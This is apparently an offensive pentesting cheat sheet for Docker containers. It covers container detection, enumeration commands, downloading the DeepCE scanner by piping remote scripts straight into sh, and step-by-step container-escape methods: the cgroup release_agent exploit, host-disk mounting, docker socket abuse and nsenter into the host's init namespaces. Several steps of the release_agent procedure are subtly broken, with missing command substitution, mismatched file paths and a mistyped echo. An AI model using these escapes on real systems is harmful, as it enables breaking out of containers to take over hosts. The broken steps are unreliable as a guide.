# Docker Container

## Am I in a container?

* Hostname is something like `dcdd01356172` or a similar hex string
* root folder contains `.dockerenv` file
* executing `cat /proc/1/cgroup` returns docker strings
* There are few processes running and none of them are kernel spawned
* Some default \*nix commands such as wget, ps, ifconfig, ip are missing

## DeepCE

Automated tool for vulnerability scanning inside a Docker container.

See [https://github.com/stealthcopter/deepce](https://github.com/stealthcopter/deepce)

### Download

```
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh

#python requests
python -c 'import requests;print(requests.get("https://github.com/stealthcopter/deepce/raw/main/deepce.sh").content)' > deepce.sh 
python3 -c 'import requests;print(requests.get("https://github.com/stealthcopter/deepce/raw/main/deepce.sh").content.decode("utf-8"))' > deepce.sh

#load in memory
wget -O - https://github.com/stealthcopter/deepce/raw/main/deepce.sh | sh
curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh | sh
```

## Manual Enumeration

### OS info

```
cat /etc/issue
cat /etc/*-release
uname -a
```

### Running processes

```
readlink -f /proc/*/exe    #link to executable file
cat /proc/*/comm           #console friendly process name (not always available)
```

### Partitions

```
cat /etc/fstab
fdisk -l
```

### Network

```
cat /proc/net/tcp
cat /proc/net/*
```

All IP addresses are printed as little-endian hexadecimal strings. For example:

IP address: `020011AC --> AC.11.00.02 --> 172.16.00.02`

Gateway mask: `0000FFFF --> FF.FF.00.00 --> 255.255.00.00`

## Container escape

### Privileged container exploit

**Requirements:**

* current user inside the container is root
* the container must be running with cap\_sys\_admin capability enabled. Verify by using the following command `capsh --print | grep sys_admin`&#x20;
* the `mount` command is present and enabled

Vulnerable containers are created with the following command

```
docker run --cap-add=SYS_ADMIN --security-opt apparmor=unconfined <img> <cmd>
```

**Procedure:**

1. mount cgroup folder in container: `mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x`
2. configure the kernel to enable execution of scripts when process is released: `echo 1 > /tmp/cgrp/x/notify_on_release`
3. find the container's file location on the host and store it in a variable: `host_path=sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
4. create an exploit file on target machine: `echo "$host_path/cmd" > /tmp/cgrp/release_agent`
5. insert code to be run in the exploit file. The output will be stored in a file called output.txt in the roof folder of the container: `echo" CMD > $host_path/output.txt" >> /exploit && chmod a+x /exploit`
6. create a process that instantly dies triggering our payload: `sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"`

### Mount host drive

**Requirements**

* current user inside the container is root
* the container must be running with cap\_sys\_admin capability enabled. Verify by using the following command `capsh --print | grep sys_admin`&#x20;
* the `mount` command is present and enabled
* it is possible to detect external drives. Verify with `fdisk -l`&#x20;

**Procedure:**

```
mkdir /tmp/sda
mount /dev/sda1 /tmp/sda
cd /tmp/sda
```

### Exposed deamon socket

**Requirements:**

* current user inside the container is root or part of docker group
* the file docker.socket is accessible inside the container. Test with `find / -type f -name docker.socket 2>/dev/null`

The exploit procedure is the same as detailed in the section about [Docker group exploits](docker.md#docker-group-exploits).

### Namespace exploitation

**Requirements:**

* current user inside the container is root
* the file `/sbin/init` is visible inside the container
* the `nsenter` command is available inside the container

**Procedure:**

Run the following command to spawn a new process with the same namespace as the process with PID 1 (init) while sharing memory, hostname and network space with the container. This process will be used to spawn a shell

```
nsenter --target 1 --mount --uts --ipc --net /bin/bash
```

